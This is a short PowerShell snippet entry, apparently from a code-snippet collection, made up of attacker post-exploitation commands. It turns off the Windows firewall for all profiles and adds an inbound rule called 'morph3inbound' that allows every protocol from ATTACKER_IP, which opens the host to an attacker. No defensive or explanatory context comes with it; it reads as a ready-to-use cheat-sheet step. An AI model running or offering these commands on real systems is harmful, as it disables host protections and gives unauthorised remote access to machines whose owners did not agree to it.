---
id: 61dda204-fdd6-448e-b9d6-52d5a000671f
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.701863+00:00'
updated_at: '2023-04-10T20:37:20.861233+00:00'
---

# Code Snippet 61dda204

**Language**: Powershell

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```


